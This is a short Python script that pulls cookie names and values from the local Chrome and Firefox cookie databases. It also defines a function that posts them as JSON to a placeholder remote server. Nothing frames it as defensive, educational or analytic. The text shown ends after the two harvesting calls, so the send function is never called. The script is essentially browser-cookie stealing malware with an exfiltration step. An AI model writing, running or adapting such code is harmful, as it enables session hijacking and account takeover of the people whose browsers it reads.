import os
import sqlite3
import requests

def get_chrome_cookies():
    # Replace 'YourUsername' with your actual username
    path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
    connection = sqlite3.connect(path)
    cursor = connection.cursor()
    cursor.execute('SELECT name, value FROM cookies')
    cookies = cursor.fetchall()
    cursor.close()
    connection.close()
    return cookies

def get_firefox_cookies():
    # Replace 'YourUsername' with your actual username
    path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
    profiles = [d for d in os.listdir(path) if d.endswith('.default')]
    cookies = []
    for profile in profiles:
        profile_path = os.path.join(path, profile, 'cookies.sqlite')
        connection = sqlite3.connect(profile_path)
        cursor = connection.cursor()
        cursor.execute('SELECT name, value FROM moz_cookies')
        cookies.extend(cursor.fetchall())
        cursor.close()
        connection.close()
    return cookies

def send_cookies_to_server(cookies):
    url = 'https://your-server.com/endpoint'
    data = {'cookies': cookies}
    response = requests.post(url, json=data)
    return response.status_code

# Get cookies from browsers
chrome_cookies = get_chrome_cookies()
firefox_cookies = get_firefox_cookies()
